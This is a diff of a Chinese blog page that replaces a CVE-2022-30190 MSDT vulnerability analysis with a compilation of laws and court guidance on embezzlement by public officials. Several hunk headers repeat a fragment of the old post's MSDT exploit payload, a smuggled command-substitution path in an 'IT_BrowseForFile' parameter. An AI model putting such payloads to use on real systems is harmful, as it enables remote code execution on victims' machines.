+<h4 id="其他依照法律从事公务的人员"><a href="#其他依照法律从事公务的人员" class="headerlink" title="其他依照法律从事公务的人员"></a>其他依照法律从事公务的人员</h4><p>村民委员会等村基层组织人员协助人民政府从事下列行政管理工作，属于刑法第九十三条第二款规定的“其他依照法律从事公务的人员。<br>1.救灾、抢险、防汛、优抚、扶贫、移民、救济款物的管理；</p>
+<p>2.社会捐助公益事业款物的管理；</p>
+<p>3.国有土地的经营和管理；</p>
+<p>4.土地征收、征用补偿费用的管理；</p>
+<p>5.代征、代缴税款；</p>
+<p>6.有关计划生育、户籍、征兵工作； </p>
+<p>7.协助人民政府从事的其他行政管理工作。</p>
+<p>村民委员会等村基层组织人员从事前款规定的公务，利用职务上的便利，非法占有公共财物、挪用公款、索取他人财物或者非法收受他人财物，构成犯罪的，适用刑法第三百八十二条和第三百八十三条贪污罪、第三百八十四条挪用公款罪、第三百八十五条和第三百八十六条受贿罪的规定。</p>
+<p>全国人民代表大会常务委员会《关于〈中华人民共和国刑法》第九十三条第二款的解释》(2009年8月27日)</p>
+<p>依法履行职责的各级人民代表大会代表；依法履行审判职责的人民陪审员；协助乡镇人民政府、街道办事处从事行政管理工作的村民委员会、居民委员会等农村和城市基层组织人员；其他由法律授权从事公务的人员。</p>
+<p>最高人民法院《全国法院审理经济犯罪案件工作座谈会纪要》(2003年11月13日 法发〔2003〕167号)</p>
+<h3 id="第一百八十三条第二款"><a href="#第一百八十三条第二款" class="headerlink" title="第一百八十三条第二款"></a>第一百八十三条第二款</h3><p>国有保险公司工作人员和国有保险公司委派到非国有保险公司从事公务的人员有前款行为的，依照本法第三百八十二条、第三百八十三条的规定定罪处罚。</p>
+<h3 id="第二百七十一条第二款"><a href="#第二百七十一条第二款" class="headerlink" title="第二百七十一条第二款"></a>第二百七十一条第二款</h3><p>国有公司、企业或者其他国有单位中从事公务的人员和国有公司、企业或者其他国有单位委派到非国有公司、企业以及其他单位从事公务的人员有前款行为的，依照本法第三百八十二条、第三百八十三条的规定定罪处罚。</p>
+<h3 id="第三百九十四条"><a href="#第三百九十四条" class="headerlink" title="第三百九十四条"></a>第三百九十四条</h3><p>国家工作人员在国内公务活动或者对外交往中接受礼物，依照国家规定应当交公而不交公，数额较大的，依照本法第三百八十二条、第三百八十三条的规定定罪处罚。</p>
+<h2 id="二、相关规定"><a href="#二、相关规定" class="headerlink" title="二、相关规定"></a>二、相关规定</h2><h3 id="如何认定共同犯罪？"><a href="#如何认定共同犯罪？" class="headerlink" title="如何认定共同犯罪？"></a>如何认定共同犯罪？</h3><p>行为人与国家工作人员勾结，利用国家工作人员的职务便利，共同侵吞、窃取、骗取或者以其他手段非法占有公共财物的，以贪污罪共犯论处。</p>
+<p>行为人与公司、企业或者其他单位的人员勾结， 利用公司、企业或者其他单位人员的职务便利，共同将该单位财物非法占为己有，数额较大的，以职务侵占罪共犯论处。</p>
+<p>公司、企业或者其他单位中，不具有国家工作人员身份的人与国家工作人员勾结，分别利用各自的职务便利，共同将本单位财物非法占为己有的，按照主犯的犯罪性质定罪。</p>
+<p>最高人民法院《关于审理贪污、职务侵占案件如何认定共同犯罪几个问题的解释》(2000年 7月8日 法释 〔2000〕15号)</p>
+<h3 id="公司法规定产生的公司负责人能否认定为受国有单位委派从事公务的人员？"><a href="#公司法规定产生的公司负责人能否认定为受国有单位委派从事公务的人员？" class="headerlink" title="公司法规定产生的公司负责人能否认定为受国有单位委派从事公务的人员？"></a>公司法规定产生的公司负责人能否认定为受国有单位委派从事公务的人员？</h3><p>受国有单位委派到非国有单位从事公务的人员的认定关键 要把握好“受委派”和“从事公务”两个特征。对于“受委 派”,无论是书面委任文件还是提名，只要是有证据证明属于 上述委派形式之一即可。在国有单位是公司实际投资人的情况 下，聘任行为人担任公司负责人，属于国有单位履行投资主体 的权利。投资主体委派公司负责人与股东选举公司经理是两个不同的程序，不能因为公司经理须经股东会选举程序而否认其 受国有单位委派从事公务的性质。</p>
+<p>湖南省高级人民法院《关于贪污贿赂案件审判适用法律若干问题的解答》(2020年9月24日)</p>
+<h3 id="如何认定村委会、村民小组长等村基层组织人员是否-“从事公务”"><a href="#如何认定村委会、村民小组长等村基层组织人员是否-“从事公务”" class="headerlink" title="如何认定村委会、村民小组长等村基层组织人员是否 “从事公务”?"></a>如何认定村委会、村民小组长等村基层组织人员是否 “从事公务”?</h3><p>第一看行为人处理相关事务是村基层组织的事务还是人民 政府的事务。第二看行为人处理相关事务是否具有职权内容。 村基层组织人员如果是在协助人民政府从事《全国人民代表大 会常务委员会关于中华人民共和国刑法第九十三条第二款的解 释》规定的行政管理工作，应当属于“其他依照法律从事公 务的人员”。村基层组织人员代表村委会管理村集体事务的不属于“从事公务”。</p>
+<p>湖南省高级人民法院《关于贪污贿赂案件审判适用法律若干问题的解答》(2020年9月24日)</p>
+<h3 id="具有有两种不同特定身份的人共同实施贪污贿赂犯罪的，应如何定罪处罚"><a href="#具有有两种不同特定身份的人共同实施贪污贿赂犯罪的，应如何定罪处罚" class="headerlink" title="具有有两种不同特定身份的人共同实施贪污贿赂犯罪的，应如何定罪处罚?"></a>具有有两种不同特定身份的人共同实施贪污贿赂犯罪的，应如何定罪处罚?</h3><p>一般应当尽量区分主从犯，按照主犯的犯罪性质定罪。需要特别指出的是，共同犯罪中同案犯具有不同的特定身份，不是一律依其不同身份分别定罪，关键是看各行为人是否分别利用了本人的职务便利实施犯罪。司法实践中，如果根据案件的实际情况，各共同犯罪人在共同犯罪中的地位、作用相当，难以区分主从犯的，可以以贪污罪或者受贿罪定罪处罚。</p>
+<p>湖南省高级人民法院《关于贪污贿赂案件审判适用 法律若干问题的解答》(2020年9月24日)</p>
+<h3 id="村民小组组长利用职务便利非-法占有公共财物行为如何定性？"><a href="#村民小组组长利用职务便利非-法占有公共财物行为如何定性？" class="headerlink" title="村民小组组长利用职务便利非 法占有公共财物行为如何定性？"></a>村民小组组长利用职务便利非 法占有公共财物行为如何定性？</h3><p>对村民小组组长利用职务上的便利，将村民小组集体财产 非法占为己有，数额较大的行为，应当依照刑法第二百七十一 条第一款的规定，以职务侵占罪定罪处罚。</p>
+<p>最高人民法院《关于村民小组组长利用职务便利非 法占有公共财物行为如何定性问题的批复》(1999年6月25 日 法释〔1999〕12号)</p>
 
                 
             </div>
@@ -549,7 +451,7 @@ IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(\\\\localhost\\c$\\windows
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://12ule.top/2023/04/16/CVE-2022-30190%20MSDT%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">https://12ule.top/2023/04/16/CVE-2022-30190%20MSDT%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a>
+                    <a href="https://12ule.top/2025/09/27/101%E7%A7%8D%E8%81%8C%E5%8A%A1%E7%8A%AF%E7%BD%AA-%E8%B4%AA%E6%B1%A1%E7%BD%AA/">https://12ule.top/2025/09/27/101%E7%A7%8D%E8%81%8C%E5%8A%A1%E7%8A%AF%E7%BD%AA-%E8%B4%AA%E6%B1%A1%E7%BD%AA/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -587,8 +489,8 @@ IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(\\\\localhost\\c$\\windows
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/CVE/">
-                                    <span class="chip bg-color">CVE</span>
+                                <a href="/tags/101%E7%A7%8D%E8%81%8C%E5%8A%A1%E7%8A%AF%E7%BD%AA/">
+                                    <span class="chip bg-color">101种职务犯罪</span>
                                 </a>
                             
                         </div>
@@ -667,17 +569,18 @@ IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(\\\\localhost\\c$\\windows
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2023/05/15/CVE-2022-34713%20MSDT%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+                <a href="/2025/09/27/101%E7%A7%8D%E8%81%8C%E5%8A%A1%E7%8A%AF%E7%BD%AA-%E8%B4%AA%E6%B1%A1%E7%BD%AA/">
                     <div class="card-image">
                         
                         
-                        <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/medias/featureimages/14.jpg" class="responsive-img" alt="CVE-2022-34713 MSDT目录遍历漏洞分析">
+                        <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/medias/featureimages/2.jpg" class="responsive-img" alt="101种职务犯罪-贪污罪">
                         
-                        <span class="card-title">CVE-2022-34713 MSDT目录遍历漏洞分析</span>
+                        <span class="card-title">101种职务犯罪-贪污罪</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -687,26 +590,27 @@ IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(\\\\localhost\\c$\\windows
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-05-15
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-09-27
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="post-category">
-                                    漏洞分析
+                            <a href="/categories/101%E7%A7%8D%E8%81%8C%E5%8A%A1%E7%8A%AF%E7%BD%AA/" class="post-category">
+                                    101种职务犯罪
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/CVE/">
-                        <span class="chip bg-color">CVE</span>
+                    <a href="/tags/101%E7%A7%8D%E8%81%8C%E5%8A%A1%E7%8A%AF%E7%BD%AA/">
+                        <span class="chip bg-color">101种职务犯罪</span>
                     </a>
                     
                 </div>
@@ -720,13 +624,13 @@ IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(\\\\localhost\\c$\\windows
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2023/03/07/CVE-2022-21882%20win32k%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/">
+                <a href="/2025/08/10/%E4%B8%AD%E5%8D%8E%E4%BA%BA%E6%B0%91%E5%85%B1%E5%92%8C%E5%9B%BD%E5%85%AC%E8%81%8C%E4%BA%BA%E5%91%98%E6%94%BF%E5%8A%A1%E5%A4%84%E5%88%86%E6%B3%95%EF%BC%882020%E5%B9%B46%E6%9C%8820%E6%97%A5%EF%BC%89/">
                     <div class="card-image">
                         
                         
-                        <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/medias/featureimages/2.jpg" class="responsive-img" alt="CVE-2022-21882 win32k内核提权分析">
+                        <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/medias/featureimages/14.jpg" class="responsive-img" alt="中华人民共和国公职人员政务处分法（2020年6月20日）">
                         
-                        <span class="card-title">CVE-2022-21882 win32k内核提权分析</span>
+                        <span class="card-title">中华人民共和国公职人员政务处分法（2020年6月20日）</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -737,14 +641,14 @@ IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(\\\\localhost\\c$\\windows
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-03-07
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-08-10
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="post-category">
-                                    漏洞分析
+                            <a href="/categories/%E6%B3%95%E8%A7%84/" class="post-category">
+                                    法规
                                 </a>
                             
                             
@@ -754,8 +658,8 @@ IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(\\\\localhost\\c$\\windows
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/CVE/">
-                        <span class="chip bg-color">CVE</span>
+                    <a href="/tags/%E6%94%BF%E5%8A%A1%E5%A4%84%E5%88%86/">
+                        <span class="chip bg-color">政务处分</span>
                     </a>
                     
                 </div>
